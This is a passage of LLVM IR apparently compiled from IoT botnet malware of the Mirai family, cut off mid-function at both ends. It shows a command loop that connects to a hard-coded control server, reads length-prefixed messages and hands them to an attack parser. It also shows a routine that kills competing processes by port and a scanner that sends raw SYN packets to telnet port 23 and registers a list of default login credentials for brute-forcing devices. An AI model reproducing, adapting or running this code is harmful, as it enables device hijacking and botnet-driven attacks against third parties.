  %296 = load i32, i32* %295, align 4
  %297 = icmp eq i32 %296, 4
  br i1 %297, label %298, label %299

; <label>:298:                                    ; preds = %294, %290, %286
  br label %86

; <label>:299:                                    ; preds = %294
  store i32 0, i32* %26, align 4
  br label %300

; <label>:300:                                    ; preds = %299
  br label %301

; <label>:301:                                    ; preds = %300, %278
  %302 = load i32, i32* %26, align 4
  %303 = icmp eq i32 %302, 0
  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %301
  call void @teardown_connection()
  br label %86

; <label>:305:                                    ; preds = %301
  %306 = load i16, i16* %27, align 2
  %307 = zext i16 %306 to i32
  %308 = icmp eq i32 %307, 0
  br i1 %308, label %309, label %313

; <label>:309:                                    ; preds = %305
  %310 = load i32, i32* @fd_serv, align 4
  %311 = bitcast i16* %27 to i8*
  %312 = call i64 @recv(i32 %310, i8* %311, i64 2, i32 16384)
  br label %86

; <label>:313:                                    ; preds = %305
  %314 = load i16, i16* %27, align 2
  %315 = call zeroext i16 @ntohs(i16 zeroext %314) #9
  store i16 %315, i16* %27, align 2
  %316 = load i16, i16* %27, align 2
  %317 = zext i16 %316 to i64
  %318 = icmp ugt i64 %317, 1024
  br i1 %318, label %319, label %322

; <label>:319:                                    ; preds = %313
  %320 = load i32, i32* @fd_serv, align 4
  %321 = call i32 @close(i32 %320)
  store i32 -1, i32* @fd_serv, align 4
  br label %322

; <label>:322:                                    ; preds = %319, %313
  %323 = call i32* @__errno_location() #9
  store i32 0, i32* %323, align 4
  %324 = load i32, i32* @fd_serv, align 4
  %325 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %326 = load i16, i16* %27, align 2
  %327 = zext i16 %326 to i64
  %328 = call i64 @recv(i32 %324, i8* %325, i64 %327, i32 16386)
  %329 = trunc i64 %328 to i32
  store i32 %329, i32* %26, align 4
  %330 = load i32, i32* %26, align 4
  %331 = icmp eq i32 %330, -1
  br i1 %331, label %332, label %347

; <label>:332:                                    ; preds = %322
  %333 = call i32* @__errno_location() #9
  %334 = load i32, i32* %333, align 4
  %335 = icmp eq i32 %334, 11
  br i1 %335, label %344, label %336

; <label>:336:                                    ; preds = %332
  %337 = call i32* @__errno_location() #9
  %338 = load i32, i32* %337, align 4
  %339 = icmp eq i32 %338, 11
  br i1 %339, label %344, label %340

; <label>:340:                                    ; preds = %336
  %341 = call i32* @__errno_location() #9
  %342 = load i32, i32* %341, align 4
  %343 = icmp eq i32 %342, 4
  br i1 %343, label %344, label %345

; <label>:344:                                    ; preds = %340, %336, %332
  br label %86

; <label>:345:                                    ; preds = %340
  store i32 0, i32* %26, align 4
  br label %346

; <label>:346:                                    ; preds = %345
  br label %347

; <label>:347:                                    ; preds = %346, %322
  %348 = load i32, i32* %26, align 4
  %349 = icmp eq i32 %348, 0
  br i1 %349, label %350, label %351

; <label>:350:                                    ; preds = %347
  call void @teardown_connection()
  br label %86

; <label>:351:                                    ; preds = %347
  %352 = load i32, i32* @fd_serv, align 4
  %353 = bitcast i16* %27 to i8*
  %354 = call i64 @recv(i32 %352, i8* %353, i64 2, i32 16384)
  %355 = load i16, i16* %27, align 2
  %356 = call zeroext i16 @ntohs(i16 zeroext %355) #9
  store i16 %356, i16* %27, align 2
  %357 = load i32, i32* @fd_serv, align 4
  %358 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %359 = load i16, i16* %27, align 2
  %360 = zext i16 %359 to i64
  %361 = call i64 @recv(i32 %357, i8* %358, i64 %360, i32 16384)
  %362 = load i16, i16* %27, align 2
  %363 = zext i16 %362 to i32
  %364 = icmp sgt i32 %363, 0
  br i1 %364, label %365, label %369

; <label>:365:                                    ; preds = %351
  %366 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %367 = load i16, i16* %27, align 2
  %368 = zext i16 %367 to i32
  call void @attack_parse(i8* %366, i32 %368)
  br label %369

; <label>:369:                                    ; preds = %365, %351
  br label %370

; <label>:370:                                    ; preds = %369, %265, %262
  br label %371

; <label>:371:                                    ; preds = %370, %261
  br label %86
                                                  ; No predecessors!
  %373 = load i32, i32* %3, align 4
  ret i32 %373
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

declare void @table_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @ensure_single_instance() #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.__SOCKADDR_ARG, align 8
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 1, i32* %2, align 4
  %5 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %5, i32* @fd_ctrl, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %0
  br label %74

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @fd_ctrl, align 4
  %10 = bitcast i32* %2 to i8*
  %11 = call i32 @setsockopt(i32 %9, i32 1, i32 2, i8* %10, i32 4) #7
  %12 = load i32, i32* @fd_ctrl, align 4
  %13 = load i32, i32* @fd_ctrl, align 4
  %14 = call i32 (i32, i32, ...) @fcntl(i32 %13, i32 3, i32 0)
  %15 = or i32 2048, %14
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 4, i32 %15)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %23

; <label>:21:                                     ; preds = %8
  %22 = call i32 @htonl(i32 2130706433) #9
  br label %25

; <label>:23:                                     ; preds = %8
  %24 = load i32, i32* @LOCAL_ADDR, align 4
  br label %25

; <label>:25:                                     ; preds = %23, %21
  %26 = phi i32 [ %22, %21 ], [ %24, %23 ]
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %28 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %27, i32 0, i32 0
  store i32 %26, i32* %28, align 4
  %29 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  %31 = call i32* @__errno_location() #9
  store i32 0, i32* %31, align 4
  %32 = load i32, i32* @fd_ctrl, align 4
  %33 = bitcast %union.__SOCKADDR_ARG* %3 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %3, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @bind(i32 %32, %struct.sockaddr* %36, i32 16) #7
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %68

; <label>:39:                                     ; preds = %25
  %40 = call i32* @__errno_location() #9
  %41 = load i32, i32* %40, align 4
  %42 = icmp eq i32 %41, 99
  br i1 %42, label %43, label %48

; <label>:43:                                     ; preds = %39
  %44 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %43
  store i8 0, i8* @ensure_single_instance.local_bind, align 1
  br label %48

; <label>:48:                                     ; preds = %47, %43, %39
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  store i32 0, i32* %51, align 4
  %52 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @fd_ctrl, align 4
  %55 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %56 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %56, %struct.sockaddr** %55, align 8
  %57 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %58 = load %struct.sockaddr*, %struct.sockaddr** %57, align 8
  %59 = call i32 @connect(i32 %54, %struct.sockaddr* %58, i32 16)
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %48
  br label %62

; <label>:62:                                     ; preds = %61, %48
  %63 = call i32 @sleep(i32 5)
  %64 = load i32, i32* @fd_ctrl, align 4
  %65 = call i32 @close(i32 %64)
  %66 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %67 = call signext i8 @killer_kill_by_port(i16 zeroext %66)
  call void @ensure_single_instance()
  br label %74

; <label>:68:                                     ; preds = %25
  %69 = load i32, i32* @fd_ctrl, align 4
  %70 = call i32 @listen(i32 %69, i32 1) #7
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %68
  br label %73

; <label>:73:                                     ; preds = %72, %68
  br label %74

; <label>:74:                                     ; preds = %73, %62, %7
  ret void
}

declare void @rand_init() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare i32 @util_strlen(i8*) #2

declare i32 @util_strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: nounwind
declare i32 @setsid() #1

declare i32 @close(i32) #2

declare signext i8 @attack_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @establish_connection() #0 {
  %1 = alloca %union.__SOCKADDR_ARG, align 8
  %2 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %2, i32* @fd_serv, align 4
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  br label %18

; <label>:5:                                      ; preds = %0
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %6 = call i32 @htonl(i32 -1335130672) #9
  store i32 %6, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %7 = call zeroext i16 @htons(i16 zeroext 1024) #9
  store i16 %7, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  %8 = load i32, i32* @fd_serv, align 4
  %9 = load i32, i32* @fd_serv, align 4
  %10 = call i32 (i32, i32, ...) @fcntl(i32 %9, i32 3, i32 0)
  %11 = or i32 2048, %10
  %12 = call i32 (i32, i32, ...) @fcntl(i32 %8, i32 4, i32 %11)
  store i8 1, i8* @pending_connection, align 1
  %13 = load i32, i32* @fd_serv, align 4
  %14 = bitcast %union.__SOCKADDR_ARG* %1 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %14, align 8
  %15 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %1, i32 0, i32 0
  %16 = load %struct.sockaddr*, %struct.sockaddr** %15, align 8
  %17 = call i32 @connect(i32 %13, %struct.sockaddr* %16, i32 16)
  br label %18

; <label>:18:                                     ; preds = %5, %4
  ret void
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #2

declare i64 @send(i32, i8*, i64, i32) #2

declare i32 @accept(i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

declare void @attack_kill_all() #2

; Function Attrs: noinline nounwind uwtable
define internal void @teardown_connection() #0 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %6

; <label>:3:                                      ; preds = %0
  %4 = load i32, i32* @fd_serv, align 4
  %5 = call i32 @close(i32 %4)
  br label %6

; <label>:6:                                      ; preds = %3, %0
  store i32 -1, i32* @fd_serv, align 4
  %7 = call i32 @sleep(i32 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i32 @rand_next() #2

declare i32 @sleep(i32) #2

declare i32 @util_local_addr() #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #5

declare void @attack_parse(i8*, i32) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

declare i32 @fcntl(i32, i32, ...) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare signext i8 @killer_kill_by_port(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca %struct.iphdr*, align 8
  %5 = alloca %struct.tcphdr*, align 8
  %6 = alloca %struct.payload*, align 8
  %7 = alloca %struct.binary*, align 8
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.scanner_connection*, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.tcphdr*, align 8
  %20 = alloca %union.__SOCKADDR_ARG, align 8
  %21 = alloca i32, align 4
  %22 = alloca [1514 x i8], align 16
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.tcphdr*, align 8
  %25 = alloca %struct.scanner_connection*, align 8
  %26 = alloca %union.__SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = call i32 @fork() #7
  store i32 %37, i32* @scanner_pid, align 4
  %38 = load i32, i32* @scanner_pid, align 4
  %39 = icmp sgt i32 %38, 0
  br i1 %39, label %43, label %40

; <label>:40:                                     ; preds = %0
  %41 = load i32, i32* @scanner_pid, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40, %0
  ret void

; <label>:44:                                     ; preds = %40
  %45 = call i32 @util_local_addr()
  store i32 %45, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %46 = call i64 @time(i64* null) #7
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* @fake_time, align 4
  %48 = call noalias i8* @calloc(i64 628, i64 8264) #7
  %49 = bitcast i8* %48 to %struct.scanner_connection*
  store %struct.scanner_connection* %49, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %1, align 4
  br label %50

; <label>:50:                                     ; preds = %74, %44
  %51 = load i32, i32* %1, align 4
  %52 = icmp slt i32 %51, 628
  br i1 %52, label %53, label %77

; <label>:53:                                     ; preds = %50
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = load i32, i32* %1, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i64 %56
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 16
  store i32 0, i32* %58, align 8
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %60 = load i32, i32* %1, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i64 %61
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 2
  store i32 -1, i32* %63, align 8
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %65 = load i32, i32* %1, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i64 %66
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 12
  store i8 0, i8* %68, align 1
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %70 = load i32, i32* %1, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i64 %71
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i32 0, i32 6
  store i32 0, i32* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %53
  %75 = load i32, i32* %1, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %1, align 4
  br label %50

; <label>:77:                                     ; preds = %50
  %78 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %78, i32* @rsck, align 4
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %77
  call void @exit(i32 0) #8
  unreachable

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* @rsck, align 4
  %83 = load i32, i32* @rsck, align 4
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i32 0)
  %85 = or i32 2048, %84
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 4, i32 %85)
  store i32 1, i32* %1, align 4
  %87 = load i32, i32* @rsck, align 4
  %88 = bitcast i32* %1 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #7
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %81
  %92 = load i32, i32* @rsck, align 4
  %93 = call i32 @close(i32 %92)
  call void @exit(i32 0) #8
  unreachable

; <label>:94:                                     ; preds = %81
  br label %95

; <label>:95:                                     ; preds = %99, %94
  %96 = call i32 @rand_next()
  %97 = and i32 %96, 65535
  %98 = trunc i32 %97 to i16
  store i16 %98, i16* %2, align 2
  br label %99

; <label>:99:                                     ; preds = %95
  %100 = load i16, i16* %2, align 2
  %101 = call zeroext i16 @ntohs(i16 zeroext %100) #9
  %102 = zext i16 %101 to i32
  %103 = icmp slt i32 %102, 1024
  br i1 %103, label %95, label %104

; <label>:104:                                    ; preds = %99
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %4, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.tcphdr*
  store %struct.tcphdr* %107, %struct.tcphdr** %5, align 8
  %108 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %109 = bitcast %struct.iphdr* %108 to i8*
  %110 = load i8, i8* %109, align 4
  %111 = and i8 %110, -16
  %112 = or i8 %111, 5
  store i8 %112, i8* %109, align 4
  %113 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %114 = bitcast %struct.iphdr* %113 to i8*
  %115 = load i8, i8* %114, align 4
  %116 = and i8 %115, 15
  %117 = or i8 %116, 64
  store i8 %117, i8* %114, align 4
  %118 = call zeroext i16 @htons(i16 zeroext 40) #9
  %119 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %120 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %119, i32 0, i32 2
  store i16 %118, i16* %120, align 2
  %121 = call i32 @rand_next()
  %122 = trunc i32 %121 to i16
  %123 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i32 0, i32 3
  store i16 %122, i16* %124, align 4
  %125 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 5
  store i8 64, i8* %126, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 6
  store i8 6, i8* %128, align 1
  %129 = call zeroext i16 @htons(i16 zeroext 23) #9
  %130 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 1
  store i16 %129, i16* %131, align 2
  %132 = load i16, i16* %2, align 2
  %133 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  store i16 %132, i16* %134, align 4
  %135 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %136 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -241
  %139 = or i16 %138, 80
  store i16 %139, i16* %136, align 4
  %140 = call i32 @rand_next()
  %141 = and i32 %140, 65535
  %142 = trunc i32 %141 to i16
  %143 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 5
  store i16 %142, i16* %144, align 2
  %145 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -513
  %149 = or i16 %148, 512
  store i16 %149, i16* %146, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.34, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.41, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.42, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 16)
